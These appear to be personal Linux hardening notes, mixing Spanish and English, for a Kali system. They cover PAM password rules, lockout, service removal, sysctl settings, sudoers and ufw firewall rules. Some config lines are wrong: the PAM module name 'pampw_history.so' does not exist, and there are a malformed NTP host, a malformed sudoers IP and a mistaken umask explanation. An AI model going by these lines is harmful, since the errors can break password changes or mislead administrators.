            Como mínimo, descomentar minlen, minclass=4 significa que debe tener al menos letra minuscula, letra mayuscula, numero y otros caracteres extraños
            ┌──(root㉿kali)-[/home/kali]
            └─# cat /etc/security/pwquality.conf
            # Configuration for systemwide password quality limits
            # Defaults:
            #
            # Number of characters in the new password that must not be present in the
            # old password.
            # difok = 1
            #
            # Minimum acceptable size for the new password (plus one if
            # credits are not disabled which is the default). (See pam_cracklib manual.)
            # Cannot be set to lower value than 6.
            minlen = 14
            #
            # The maximum credit for having digits in the new password. If less than 0
            # it is the minimum number of digits in the new password.
            # dcredit = 0
            #
            # The maximum credit for having uppercase characters in the new password.
            # If less than 0 it is the minimum number of uppercase characters in the new
            # password.
            # ucredit = 0
            #
            # The maximum credit for having lowercase characters in the new password.
            # If less than 0 it is the minimum number of lowercase characters in the new
            # password.
            # lcredit = 0
            #
            # The maximum credit for having other characters in the new password.
            # If less than 0 it is the minimum number of other characters in the new
            # password.
            # ocredit = 0
            #
            # The minimum number of required classes of characters for the new
            # password (digits, uppercase, lowercase, others).
            minclass = 4
            #
            # The maximum number of allowed consecutive same characters in the new password.
            # The check is disabled if the value is 0.
            # maxrepeat = 0
            #
            # The maximum number of allowed consecutive characters of the same class in the
            # new password.
            # The check is disabled if the value is 0.
            # maxclassrepeat = 0
            #
            # Whether to check for the words from the passwd entry GECOS string of the user.
            # The check is enabled if the value is not 0.
            # gecoscheck = 0
            #
            # Whether to check for the words from the cracklib dictionary.
            # The check is enabled if the value is not 0.
            # dictcheck = 1
            #
            # Whether to check if it contains the user name in some form.
            # The check is enabled if the value is not 0.
            # usercheck = 1
            #
            # Length of substrings from the username to check for in the password
            # The check is enabled if the value is greater than 0 and usercheck is enabled.
            # usersubstr = 0
            #
            # Whether the check is enforced by the PAM module and possibly other
            # applications.
            # The new password is rejected if it fails the check and the value is not 0.
            # enforcing = 1
            #
            # Path to the cracklib dictionaries. Default is to use the cracklib default.
            # dictpath =
            #
            # Prompt user at most N times before returning with error. The default is 1.
            # retry = 3
            #
            # Enforces pwquality checks on the root user password.
            # Enabled if the option is present.
            # enforce_for_root
            #
            # Skip testing the password quality for users that are not present in the
            # /etc/passwd file.
            # Enabled if the option is present.
            # local_users_only

# Add robustness to the passwords

        Edit the next file,
            /etc/pam.d/common-password
        search the next line, be sure to put 3 in retry
            pam_pwquality.so retry=3
        Add the next line:             
            password    required    pampw_history.so    remember=5
        be sure to use sha512 or yescrypt algorithm. In my case, i respect yescrypt.

            ┌──(root㉿kali)-[/home/kali]
            └─# cat /etc/pam.d/common-password
            #
            # /etc/pam.d/common-password - password-related modules common to all services
            #
            # This file is included from other service-specific PAM config files,
            # and should contain a list of modules that define the services to be
            # used to change user passwords.  The default is pam_unix.

            # Explanation of pam_unix options:
            # The "yescrypt" option enables
            #hashed passwords using the yescrypt algorithm, introduced in Debian
            #11.  Without this option, the default is Unix crypt.  Prior releases
            #used the option "sha512"; if a shadow password hash will be shared
            #between Debian 11 and older releases replace "yescrypt" with "sha512"
            #for compatibility .  The "obscure" option replaces the old
            #`OBSCURE_CHECKS_ENAB' option in login.defs.  See the pam_unix manpage
            #for other options.

            # As of pam 1.0.1-6, this file is managed by pam-auth-update by default.
            # To take advantage of this, it is recommended that you configure any
            # local modules either before or after the default block, and use
            # pam-auth-update to manage selection of other modules.  See
            # pam-auth-update(8) for details.

            # here are the per-package modules (the "Primary" block)
            password        requisite                       pam_pwquality.so retry=3
            password        [success=1 default=ignore]      pam_unix.so obscure use_authtok try_first_pass yescrypt
            # here's the fallback if no module succeeds
            password        requisite                       pam_deny.so
            # prime the stack with a positive return value if there isn't one already;
            # this avoids us returning an error just because nothing sets a success code
            # since the modules above will each just jump around
            password        required                        pam_permit.so
            # and here are more per-package modules (the "Additional" block)
            password        optional        pam_gnome_keyring.so
            # end of pam-auth-update config

            # Añado esto
            # Historial de contraseñas y cifrado
            password    required    pampw_history.so    remember=5

# Caducidad e intervalo de tiempo para cambiarlo

            ┌──(root㉿kali)-[/home/kali]
            └─# leafpad /etc/login.defs
            ...
            #
            # Password aging controls:
            #
            #   PASS_MAX_DAYS   Maximum number of days a password may be used.
            #   PASS_MIN_DAYS   Minimum number of days allowed between password changes.
            #   PASS_WARN_AGE   Number of days warning given before a password expires.
            #
            PASS_MAX_DAYS   90
            PASS_MIN_DAYS   1
            PASS_WARN_AGE   7

# Establecer el tiempo de bloqueo de cuenta por inactividad

        Por defecto, lo establecemos a 30 días,

            ┌──(root㉿kali)-[/home/kali]
            └─# useradd -D -f 30       

        Modificamos para cada usuario, en mi caso para estos dos usuarios                                                                                                                                                                                                                 
            ┌──(root㉿kali)-[/home/kali]
            └─# chage --inactive 30 root

            ┌──(root㉿kali)-[/home/kali]
            └─# chage --inactive 30 kali

        Comprobamos                                                                                                                                                                                                             
            ┌──(root㉿kali)-[/home/kali]
            └─# useradd -D | grep INACTIVE
            INACTIVE=30

            ┌──(root㉿kali)-[/home/kali]
            └─# grep -E ^[^:]+:[^\!*] /etc/shadow | cut -d: -f1,7
            root:30
            kali:30

 # Establecer el timeout por inactividad

        Pending!

# Desactivar servicios innecesarios

    List all services, running or not...

        > systemctl list-units --type=service
        ...

    List running services... It is named like cron.service

    > systemctl | grep running
    ...
    ⭐  ~  ok  at 13:27:32 >   

    Too many services, right? disable one by one with:

    > systemctl stop postgresql@14-main.service
    > systemctl disable postgresql@14-main.service
    > sudo systemctl status postgresql@14-main.service
    ○ postgresql@14-main.service - PostgreSQL Cluster 14-main
    Loaded: loaded (/lib/systemd/system/postgresql@.service; enabled-runtime; preset: disabled)
    Drop-In: /usr/lib/systemd/system/postgresql@.service.d
    └─kali_postgresql.conf
    Active: inactive (dead) since Mon 2022-09-19 13:22:38 CEST; 1min 5s ago
    Duration: 1h 46min 24.729s
    Process: 7851 ExecStop=/usr/bin/pg_ctlcluster --skip-systemctl-redirect -m fast 14-main stop (co>
    Main PID: 1108 (code=exited, status=0/SUCCESS)
    CPU: 4.478s

    Sep 19 11:36:10 kali systemd[1]: Starting PostgreSQL Cluster 14-main...
    Sep 19 11:36:13 kali systemd[1]: Started PostgreSQL Cluster 14-main.
    Sep 19 13:22:38 kali systemd[1]: Stopping PostgreSQL Cluster 14-main...
    Sep 19 13:22:38 kali systemd[1]: postgresql@14-main.service: Deactivated successfully.
    Sep 19 13:22:38 kali systemd[1]: Stopped PostgreSQL Cluster 14-main.
    Sep 19 13:22:38 kali systemd[1]: postgresql@14-main.service: Consumed 4.478s CPU time.
    lines 1-16/16 (END)

    Which ones are truly essential to run in Kali/Ubuntu Server?

    # Establecer el bloqueo de cuenta tras fallos de autentificacion

    > sudo leafpad /etc/pam.d/common-auth
    [sudo] password for kali:

    añadir la siguiente línea:

    auth required pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900

# Configurar las cuentas de servicio con el parametro nologin

        Editamos /etc/passwd

        Añadimos a los servicios :/usr/sbin/nologin
        ...
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        ...

# configurar valores por defecto de umask

        Editamos
            /etc/bash.bashrc
            /etc/profile

            Todos los scripts debajo de profile.d:

            /etc/profile.d/*.sh

            añadimos a cada uno de esos ficheros el valor:

            umask 027

            que significa, control total para el creador (7), permisos de lectura y ejecución para el grupo (2), todo denegado para el resto (0).

# Restringir el acceso al comando su

        https://www.zeppelinux.es/como-agregar-un-usuario-a-un-grupo-en-linux/#an_n5

        https://computingforgeeks.com/restrict-su-access-to-privileged-accounts-linux/


# Fortificar el servidor por ssh

        Pendiente

# Do you need to stop nfs service?

    Vamos a comprobar si hay puertos abiertos en tu sistema localhost.
    Si aún no tienes nmap instalado, usa el comando:

    ❯ sudo apt install nmap

    Luego

    ❯ nmap localhost
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 10:52 EDT
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.000081s latency).
    Other addresses for localhost (not scanned): ::1
    Not shown: 998 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    111/tcp  open  rpcbind
    2049/tcp open  nfs

    Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds

    Paramos la ejecucion del servicio nfs:
    ❯ sudo systemctl stop nfs
    Failed to stop nfs.service: Unit nfs.service not loaded.

    nfs es usado por el servicio portmap, por lo que para parar nfs, paramos primero portmap y luego nfs-kernel-server.

    ❯ sudo service portmap stop
    Warning: Stopping portmap.service, but it can still be activated by:
      rpcbind.socket
    ❯ sudo service nfs-kernel-server stop

# Do you need to delete the nfs service?

    ❯ sudo apt-get --purge remove nfs-kernel-server nfs-common portmap

# Do you need to disable and stop rpcbind service?

    Became root,
    ❯ sudo su

    run the next commands:

    ❯ systemctl disable rpcbind.target
    ❯ systemctl disable rpcbind.socket
    ❯ systemctl disable rpcbind.service
    ❯ systemctl stop rpcbind.target
    ❯ systemctl stop rpcbind.socket
    ❯ systemctl stop rpcbind.service

# Do you need to disable and stop neo4j?

    ne04j usually listens in 7473 and 7474 ports, so...

    ❯ neo4j disable
    Usage: neo4j { console | start | stop | restart | status | version }
    ❯ neo4j stop
    Neo4j not running
    rm: remove write-protected regular file '/var/run/neo4j/neo4j.pid'? y
    rm: cannot remove '/var/run/neo4j/neo4j.pid': Permission denied
    ❯ sudo neo4j stop
    Stopping Neo4j.. stopped
    ❯ sudo neo4j status
    Neo4j is not running
    ❯ sudo systemctl status neo4j.service
    ○ neo4j.service - Neo4j Graph Database
         Loaded: loaded (/lib/systemd/system/neo4j.service; disabled; preset: disabled)
         Active: inactive (dead)
    ❯ sudo systemctl disable neo4j.service
    Synchronizing state of neo4j.service with SysV service script with /lib/systemd/systemd-sysv-install.
    Executing: /lib/systemd/systemd-sysv-install disable neo4j
    perl: warning: Setting locale failed.
    perl: warning: Please check that your locale settings:
            LANGUAGE = "",
            LC_ALL = (unset),
            LANG = "en_US.UTF-8"
        are supported and installed on your system.
    perl: warning: Falling back to the standard locale ("C").
    perl: warning: Setting locale failed.
    perl: warning: Please check that your locale settings:
            LANGUAGE = "",
            LC_ALL = (unset),
            LANG = "en_US.UTF-8"
        are supported and installed on your system.
    perl: warning: Falling back to the standard locale ("C").
    perl: warning: Setting locale failed.
    perl: warning: Please check that your locale settings:
            LANGUAGE = "",
            LC_ALL = (unset),
            LANG = "en_US.UTF-8"
        are supported and installed on your system.
    perl: warning: Falling back to the standard locale ("C").
    perl: warning: Setting locale failed.
    perl: warning: Please check that your locale settings:
            LANGUAGE = "",
            LC_ALL = (unset),
            LANG = "en_US.UTF-8"
        are supported and installed on your system.
    perl: warning: Falling back to the standard locale ("C").

    ❯ ports
    PROC             PID    USER      IPV   PROTO   BIND:PORT
    containerd       10933  root      IPv4  TCP     127.0.0.1:39533
    NetworkManager   51986  root      IPv4  UDP     192.168.85.130:68->192.168.85.254:67
    charon           42335  root      IPv4  UDP     *:500
    charon           42335  root      IPv4  UDP     *:4500
    firefox-esr      95783  kali      IPv4  UDP     *:48285
    charon           42335  root      IPv6  UDP     *:500
    charon           42335  root      IPv6  UDP     *:4500

# Add this line to /etc/sudoers

    # You need to know which user run sudo

    Defaults        logfile=/var/log/sudo.log

    optional, maybe you want to do this...

    # Host alias specification
    Host_Alias BBDD = 192.168.023
    # User alias specification
    User_Alias BDOP = kali,mysqluser
    # Cmnd alias specification
    Cmnd_Alias BDBKP = /bin/mysqldump, /usr/bin/back.sh
    # User privilege specification
    root    ALL=(ALL:ALL) ALL

    BDOP    BBDD=(root:root) NOPASSWD:BDBKP

    # Members of the admin group may gain root privileges
    %admin ALL=(ALL) ALL
    # Allow members of group sudo to execute any command
    %sudo   ALL=(ALL:ALL) ALL

# Do you need to know what connections are you doing? use conntrack

    ❯ sudo conntrack -L -p tcp
    tcp      6 431968 ESTABLISHED src=192.168.85.130 dst=52.24.10.4 sport=44402 dport=443 src=52.24.10.4 dst=192.168.85.130 sport=443 dport=44402 [ASSURED] mark=0 use=1
    tcp      6 431968 ESTABLISHED src=192.168.85.130 dst=18.154.48.122 sport=42512 dport=443 src=18.154.48.122 dst=192.168.85.130 sport=443 dport=42512 [ASSURED] mark=0 use=1
    tcp      6 431957 ESTABLISHED src=192.168.85.130 dst=142.250.184.1 sport=36768 dport=443 src=142.250.184.1 dst=192.168.85.130 sport=443 dport=36768 [ASSURED] mark=0 use=1
    tcp      6 82 TIME_WAIT src=192.168.85.130 dst=108.157.108.68 sport=50428 dport=80 src=108.157.108.68 dst=192.168.85.130 sport=80 dport=50428 [ASSURED] mark=0 use=1
    tcp      6 431957 ESTABLISHED src=192.168.85.130 dst=142.250.185.14 sport=44590 dport=443 src=142.250.185.14 dst=192.168.85.130 sport=443 dport=44590 [ASSURED] mark=0 use=1
    tcp      6 431707 ESTABLISHED src=192.168.85.130 dst=198.252.206.25 sport=46572 dport=443 src=198.252.206.25 dst=192.168.85.130 sport=443 dport=46572 [ASSURED] mark=0 use=1
    tcp      6 82 TIME_WAIT src=192.168.85.130 dst=108.157.108.68 sport=50426 dport=80 src=108.157.108.68 dst=192.168.85.130 sport=80 dport=50426 [ASSURED] mark=0 use=1
    tcp      6 82 TIME_WAIT src=192.168.85.130 dst=108.157.108.68 sport=50430 dport=80 src=108.157.108.68 dst=192.168.85.130 sport=80 dport=50430 [ASSURED] mark=0 use=1
    tcp      6 10 TIME_WAIT src=192.168.85.130 dst=104.18.103.100 sport=55670 dport=80 src=104.18.103.100 dst=192.168.85.130 sport=80 dport=55670 [ASSURED] mark=0 use=1
    tcp      6 82 TIME_WAIT src=192.168.85.130 dst=108.157.108.68 sport=50432 dport=80 src=108.157.108.68 dst=192.168.85.130 sport=80 dport=50432 [ASSURED] mark=0 use=1
    tcp      6 431956 ESTABLISHED src=192.168.85.130 dst=142.250.184.3 sport=51630 dport=443 src=142.250.184.3 dst=192.168.85.130 sport=443 dport=51630 [ASSURED] mark=0 use=1
    tcp      6 431961 ESTABLISHED src=192.168.85.130 dst=35.165.143.157 sport=48020 dport=443 src=35.165.143.157 dst=192.168.85.130 sport=443 dport=48020 [ASSURED] mark=0 use=1
    tcp      6 431958 ESTABLISHED src=192.168.85.130 dst=140.82.114.25 sport=33788 dport=443 src=140.82.114.25 dst=192.168.85.130 sport=443 dport=33788 [ASSURED] mark=0 use=1
    tcp      6 431963 ESTABLISHED src=192.168.85.130 dst=34.120.195.249 sport=52270 dport=443 src=34.120.195.249 dst=192.168.85.130 sport=443 dport=52270 [ASSURED] mark=0 use=1
    tcp      6 85 TIME_WAIT src=192.168.85.130 dst=18.154.19.109 sport=49306 dport=443 src=18.154.19.109 dst=192.168.85.130 sport=443 dport=49306 [ASSURED] mark=0 use=1
    tcp      6 431966 ESTABLISHED src=192.168.85.130 dst=108.157.96.46 sport=56996 dport=443 src=108.157.96.46 dst=192.168.85.130 sport=443 dport=56996 [ASSURED] mark=0 use=1
    tcp      6 431964 ESTABLISHED src=192.168.85.130 dst=142.250.201.67 sport=56110 dport=443 src=142.250.201.67 dst=192.168.85.130 sport=443 dport=56110 [ASSURED] mark=0 use=1
    tcp      6 11 TIME_WAIT src=192.168.85.130 dst=192.99.200.113 sport=37540 dport=80 src=192.99.200.113 dst=192.168.85.130 sport=80 dport=37540 [ASSURED] mark=0 use=2
    tcp      6 431964 ESTABLISHED src=192.168.85.130 dst=18.154.48.69 sport=34058 dport=443 src=18.154.48.69 dst=192.168.85.130 sport=443 dport=34058 [ASSURED] mark=0 use=1
    tcp      6 431957 ESTABLISHED src=192.168.85.130 dst=142.250.200.78 sport=34652 dport=443 src=142.250.200.78 dst=192.168.85.130 sport=443 dport=34652 [ASSURED] mark=0 use=1
    tcp      6 431964 ESTABLISHED src=192.168.85.130 dst=104.16.148.64 sport=56114 dport=443 src=104.16.148.64 dst=192.168.85.130 sport=443 dport=56114 [ASSURED] mark=0 use=1
    tcp      6 431967 ESTABLISHED src=192.168.85.130 dst=108.157.109.12 sport=53636 dport=443 src=108.157.109.12 dst=192.168.85.130 sport=443 dport=53636 [ASSURED] mark=0 use=1
    conntrack v1.4.6 (conntrack-tools): 22 flow entries have been shown.

# Do you need to know what ports are opened by files/processes? Put this script in your .bashrc and reload bash

    Para editar el fichero .bashrc, lee antes esta guía si aún tenéis dudas:

    https://ubunlog.com/bashrc-modifica-prompt-bash/?_gl=1%2A1feezy4%2A_ga%2AYW1wLU0weXllbDJDakZ0S3R0Q0trWmZ6WW1SQVlsVTZGRm5WX3ZYUm9PUnlaeFNQMmNFSzU1QU5rQkI5Mlh0UE1Ic1Q

    ports() {
    (
        echo 'PROC PID USER x IPV x x PROTO BIND PORT'
        (
            sudo lsof +c 15 -iTCP -sTCP:LISTEN -P -n | tail -n +2
            sudo lsof +c 15 -iUDP -P -n | tail -n +2 | egrep -v ' (127\.0\.0\.1|\[::1\]):'
        ) | sed -E 's/ ([^ ]+):/ \1 /' | sort -k8,8 -k5,5 -k1,1 -k10,10n
    ) | awk '{ printf "%-16s %-6s %-9s %-5s %-7s %s:%s\n",$1,$2,$3,$5,$8,$9,$10 }'
    }

    Para confirmar cambios en bash, bien cerráis y volvéis a abrir una terminal, o ejecutais el siguiente comando en la misma terminal donde habéis realizado el cambio:

    ❯ source ~/.bashrc

    También es posible que no estéis usando bash como vuestro tío, y que estéis usando zsh, por ejemplo, entonces tenéis que modificar el fichero .zshrc

    El principio es el mismo, estará guardado en el directorio hombre de vuestro usuario, en mi caso, /home/kali/.zshrc

# Configuracion de servidor de tiempo

    ❯ systemctl enable systemd-timesyncd.service
    ==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-unit-files ===
    Authentication is required to manage system service or unit files.                                                                                                                                            
    Authenticating as: Kali,,, (kali)
    Password:
    ==== AUTHENTICATION COMPLETE ===
    ❯ systemctl status systemd-timesyncd
    ● systemd-timesyncd.service - Network Time Synchronization
         Loaded: loaded (/lib/systemd/system/systemd-timesyncd.service; enabled; preset: enabled)
         Active: active (running) since Tue 2022-09-20 04:58:58 EDT; 6h ago
           Docs: man:systemd-timesyncd.service(8)
       Main PID: 82270 (systemd-timesyn)
         Status: "Contacted time server 178.215.228.24:123 (0.debian.pool.ntp.org)."
          Tasks: 2 (limit: 2234)
         Memory: 1.1M
            CPU: 134ms
         CGroup: /system.slice/systemd-timesyncd.service
                 └─82270 /lib/systemd/systemd-timesyncd

    Sep 20 04:58:58 kali systemd[1]: Starting Network Time Synchronization...
    Sep 20 04:58:58 kali systemd[1]: Started Network Time Synchronization.
    Sep 20 04:58:59 kali systemd-timesyncd[82270]: Contacted time server 178.215.228.24:123 (0.debian.pool.ntp.org).
    Sep 20 04:58:59 kali systemd-timesyncd[82270]: Initial clock synchronization to Tue 2022-09-20 04:58:59.067376 EDT.

    ❯ cat /etc/systemd/timesyncd.conf
    #  This file is part of systemd.
    #
    #  systemd is free software; you can redistribute it and/or modify it under the
    #  terms of the GNU Lesser General Public License as published by the Free
    #  Software Foundation; either version 2.1 of the License, or (at your option)
    #  any later version.
    #
    # Entries in this file show the compile time defaults. Local configuration
    # should be created by either modifying this file, or by creating "drop-ins" in
    # the timesyncd.conf.d/ subdirectory. The latter is generally recommended.
    # Defaults can be restored by simply deleting this file and all drop-ins.
    #
    # See timesyncd.conf(5) for details.

    [Time]
    NTP=0.es.pool.ntp.org 1.es.pool.es.ntp.org 2.es.pool.ntp.org 3.es.pool.ntp.org
    FallbackNTP=0.debian.pool.ntp.org 1.debian.pool.ntp.org 2.debian.pool.ntp.org 3.debian.pool.ntp.org pool.ntp.org
    RootDistanceMaxSec=1
    #PollIntervalMinSec=32
    #PollIntervalMaxSec=2048
    #ConnectionRetrySec=30
    #SaveIntervalSec=60

    ❯ systemctl start systemd-timesyncd.service
    ==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
    Authentication is required to start 'systemd-timesyncd.service'.                                                                                                                                              
    Authenticating as: Kali,,, (kali)
    Password:
    ==== AUTHENTICATION COMPLETE ===

    ❯ timedatectl set-ntp true
    ==== AUTHENTICATING FOR org.freedesktop.timedate1.set-ntp ===
    Authentication is required to control whether network time synchronization shall be enabled.                                                                                                                  
    Authenticating as: Kali,,, (kali)
    Password:
    ==== AUTHENTICATION COMPLETE ===
    1. Editar correctamente el fstab con las flags adecuadas en cada partición (nodev, noexec, nosuid, etc) para una securización adecuada.
    2. Editar los permisos del directorio btmp a 660.
    3. Si tenéis un SSD, activar el elevator=noop, así como los servicios para que se ejecute TRIM correctamente.
    4. Desactivar el usuario invitado si lo tenéis activo.
    5. Activar sudo y desactivar el usuario root (en caso de querer una mayor seguridad).
    6. Revisar bien los paquetes y directorios. Eliminar paquetes que no utilicemos y paquetes potencialmente peligrosos como el de telnet.
    7. Revisar correctamente los servicios y desactivar los que no queramos activos. Si utilizáis SystemD debéis utilizar la orden "systemctl list-unit-files" para verlos.
    8. Activar y configurar el cortafuegos. Con esta página (http://www.puertosabiertos.com) podéis averiguar cuantos puertos peligrosos tenéis abiertos. Con que os salgan todos en verde, es suficiente.
    9. Agregar las reglas para evitar el spoffing a través del archivo sysctl.conf en la mayoría de distribuciones (Linux puede, de manera nativa, evitar este tráfico).
    10. Desactivar el ping (es muy peligroso tener el recibo del ping activo).
    11. Editar los permisos de la Umask a 027.
    12. Configurar correctamente la swappines si no la utilizáis.
    13. Configurar correctamente las DNS para evitar el spoffing de DNS.
    14. Asegurar el funcionamiento correcto de las IRQ con el IRQBALANCE

# Comprueba los servicios instalados

    Desinstala o deshabilita todo lo que activamente no uses. Si tienes dudas, búscalo.

    Los listamos...
    ❯ sudo service --status-all
    [sudo] contraseña para kali:

    Los que no quieras, los deshabilitas del arranque,
    ❯ sudo systemctl --now disable neo4j.service
    [sudo] contraseña para kali:
    Synchronizing state of neo4j.service with SysV service script with /lib/systemd/systemd-sysv-install.
    Executing: /lib/systemd/systemd-sysv-install disable neo4j

    luego, si quieres los desinstalas.
    ❯ sudo apt remove neo4j
    Leyendo lista de paquetes... Hecho
    Creando árbol de dependencias... Hecho
    Leyendo la información de estado... Hecho
    Los paquetes indicados a continuación se instalaron de forma automática y ya no son necesarios.
      cypher-shell daemon
    Utilice «sudo apt autoremove» para eliminarlos.
    Los siguientes paquetes se ELIMINARÁN:
      neo4j
    0 actualizados, 0 nuevos se instalarán, 1 para eliminar y 126 no actualizados.
    Se liberarán 118 MB después de esta operación.
    ¿Desea continuar? [S/n]
    (Leyendo la base de datos ... 354962 ficheros o directorios instalados actualmente.)
    Desinstalando neo4j (1:3.5.14) ...
    Procesando disparadores para man-db (2.10.2-3) ...
    Procesando disparadores para kali-menu (2022.4.1) ...

# Audita el sistema de vez en cuando

    A día de hoy, uso lynis

    ❯ sudo apt install lynis
    ...
    ❯ lynis audit system

    [ Lynis 3.0.7 ]
    ...
    Files:
    - Test and debug information      : /home/kali/lynis.log
    - Report data                     : /home/kali/lynis-report.dat
    ...

    Atiende con cuidado lo que te digan esos ficheros de log, sigue sus recomendaciones.

    Ejecuta de vez en cuando

    ❯ systemctl --now status
    ● kali
        State: degraded
        Units: 262 loaded (incl. loaded aliases)
         Jobs: 0 queued
       Failed: 1 units
    ...

    Ok, vemos que hay un servicio que ha fallado, podemos averiguar cuál es con el comando:

    ❯ systemctl --failed
      UNIT                       LOAD   ACTIVE SUB    DESCRIPTION               
    ● postgresql@14-main.service loaded failed failed PostgreSQL Cluster 14-main

    LOAD   = Reflects whether the unit definition was properly loaded.
    ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
    SUB    = The low-level unit activation state, values depend on unit type.
    1 loaded units listed.

    Vemos que es el servicio de base de datos postgres, creo que se utiliza en kali para mantener
    los datos del framework Metasploit.

    Veamos si podemos sacar algo en claro del log...

    ❯ journalctl -xe
    ░░ Support: https://www.debian.org/support
    ░░
    ░░ The unit man-db.service has successfully entered the 'dead' state.
    sep 22 06:13:35 kali systemd[1]: Finished Daily man-db regeneration.
    ░░ Subject: A start job for unit man-db.service has finished successfully
    ░░ Defined-By: systemd
    ░░ Support: https://www.debian.org/support
    ░░
    ░░ A start job for unit man-db.service has finished successfully.
    ░░
    ░░ The job identifier is 1661.
    ...

    Leelo con mucha atención para sacar algo en claro, aunque, personalmente yo no he podido, por lo que trato de resetear los servicios que fallaron...

    ❯ sudo systemctl reset-failed

    Compruebo de nuevo, y ahora parece que todo va bien. Travesura realizada.

    ❯ systemctl --now status
    ● kali
        State: running
        Units: 262 loaded (incl. loaded aliases)
         Jobs: 0 queued
       Failed: 0 units
        Since: Thu 2022-09-22 05:02:13 EDT; 1h 24min ago
      systemd: 251.4-3
       CGroup: /
    ...

    Aprovecho para que conozcais una de las páginas web más importantes para poder preguntar y aprender de otras personas, stackexchange

    https://unix.stackexchange.com/questions/447561/systemctl-status-shows-state-degraded

# Definición de particiones en un servidor

    Particionar un disco es beneficioso debido a que si ocurre un problema, ocurrirá en en esa partición, a menos que sea un fallo catastrófico del disco.
    Una partición se puede montar con las opciones de montaje específicas y más eficaces.

    Se propone particionar un disco de 40GB en:

        /                   14GB    ext4
        /home               10GB    ext4
        /tmp                1GB     ext4
        /var                10GB    ext4
        /var/log            1GB     ext4
        /var/log/audit      1GB     ext4
        /var/tmp            1GB     ext4
        /swapp              2GB     swap

    Configurar el fichero /etc/fstab de manera adecuada, que cada partición tenga el nodev, nosuid, etc...
    Esta es una tarea muy delicada y que depende muchísimo del propósito que tenga el servidor que queráis montar.
    Una vez que lo tengais claro, podréis elegir la mejor configuración. Por ejemplo, no es lo mismo configurar un servidor de correo, que
    uno para alojar un servidor de base de datos, de aplicaciones, uno web o uno para tener muchos usuarios concurrentes.

    https://www.debian.org/releases/stable/s390x/apcs03.es.html

# Configuración de red. MUY IMPORTANTE

    /etc/sysctl.conf

    Solo voy a tener en cuenta IPV4, pero llegará un momento en el que activar IPV6.
    Todos los comandos siguientes se deben lanzar como root

    Deshabilitar redireccion ICMP

        sysctl -w net.ipv4.conf.all.send_redirects=0
        sysctl -w net.ipv4.conf.default.send_redirects=0
        sysctl -w net.ipv4.route.flush=1

    Deshabilitar IP forwarding

        sysctl -w net.ipv4.ip_forward=0

    Deshabilitar respuestas ICMP broadcast

        sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
        sysctl -w net.ipv4.route.flush=1

    Registro solo de paquetes que cumplen estándares

        sysctl -w net.ipv4.icmp_ignore_bogus_error_responses=1
        sysctl -w net.ipv4.route.flush=1

    Aseguramiento del origen

        sysctl -w net.ipv4.conf.all.rp_filter=1
        sysctl -w net.ipv4.conf.default.rp_filter=1
        sysctl -w net.ipv4.route.flush=1

    TCP SYN Cookies

        sysctl -w net.ipv4.tcp_syncookies=1
        sysctl -w net.ipv4.route.flush=1

    Los comandos anteriores se pierden si reinicias la máquina, por lo que mejor dejarlos activados
    copiando lo siguiente en el fichero /etc/sysctl.conf

    # Deshabilitar redireccion ICMP
    net.ipv4.conf.all.send_redirects=0
    net.ipv4.conf.default.send_redirects=0
    net.ipv4.ip_forward=0
    # Deshabilitar IP forwarding
    net.ipv4.icmp_echo_ignore_broadcasts=1
    # Registro solo de paquetes que cumplen estándares
    net.ipv4.icmp_ignore_bogus_error_responses=1
    # Aseguramiento del origen
    net.ipv4.conf.all.rp_filter=1
    net.ipv4.conf.default.rp_filter=1
    # TCP SYN Cookies
    net.ipv4.tcp_syncookies=1

    Esto siguiente no debería hacer falta en el fichero, sirve para aplicar los cambios en caliente.
    # Aplicamos cambios
    net.ipv4.route.flush=1


# Protocolos no habituales

    Hay que deshabilitar los protocolos que no vayas a usar.
    Para ello crearemos un fichero en /etc/modprobe.d/

    Datagram Congestion Control Protocol
        dccp.conf
        El contenido del fichero:
        install dccp /bin/true
    Stream Control Transmission Protocol
        sctp.conf
        install sctp /bin/true
    Reliable Datagram Sockets
        rds.conf
        install rds /bin/true
    Transparent Inter-process communication
        tipc.conf
        install tipc /bin/true

# Configuración del firewall (ufw)

    https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands

    Para instalarlo:

        sudo apt install ufw

        # Denegar todo el tráfico de entrada:
        ufw default deny incoming
        # Denegar todo el tráfico de salida:
        ufw default deny outgoing
        # Denegar todo el tráfico enrutado:
        ufw default deny routed
        # Habilitar tráfico loopback pero aislarlo del resto de interfaces:
        ufw allow in on lo
        ufw deny in from 127.0.0.1/8
        # habilitar conexiones entrantes y salientes permitidas:
        # las salientes coinciden con los servicios que queremos acceder desde el servidor
        ufw allow out to <IP or any> port <puerto>
        # habilitar conexion saliente a servicios de internet,
        # vamos, para que puedas navegar por internet:
        ufw allow out to any port 80
        ufw allow out to any port 443
        ufw allow out to any port 53
        # habilitar conexiones entrantes, es decir, tienes un servicio que quieres exponer al exterior
        ufw allow in <puerto>/(tcp o udp)
        # p ej, quieres abrir el puerto 80 de tu servidor apache
        ufw allow in 80/tcp
        # quieres abrir el servicio ssh que normalmente escucha en el puerto 22
        ufw allow in 22/tcp
        # quieres abrir el puerto 8080 del tomcat?
        ufw allow in 8080/tcp
        # finalmente, aplicamos cambios
        ufw enable
        # comprobar el estado del firewall
        ufw status

        # las entrantes se corresponden con los servicios que presta el servidor

        # listar reglas, quizas necesitas borrar una?
        sudo ufw status numbered
        # por ejemplo, borro la 1
        sudo ufw delete 1
        # listar perfiles:
        ┌──(root㉿kali)-[/home/kali]
        └─# ufw app list
        Available applications:
          AIM
          Bonjour
          CIFS
          DNS
          Deluge
          IMAP
          IMAPS
          IPP
          KTorrent
          Kerberos Admin
          Kerberos Full
          Kerberos KDC
          Kerberos Password
          LDAP
          LDAPS
          LPD
          MSN
          MSN SSL
          Mail submission
          NFS
          Nginx Full
          Nginx HTTP
          Nginx HTTPS
          OpenSSH
          POP3
          POP3S
          PeopleNearby
          SMTP
          SSH
          Samba
